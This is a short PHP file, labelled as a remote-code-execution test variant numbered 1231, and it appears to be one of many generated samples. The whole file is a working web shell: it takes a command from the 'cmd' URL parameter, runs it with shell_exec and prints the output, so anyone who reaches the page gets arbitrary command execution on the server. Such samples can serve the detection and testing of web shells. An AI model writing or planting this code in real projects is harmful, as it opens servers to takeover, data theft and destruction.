<?php
// RCE test variation #1231
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>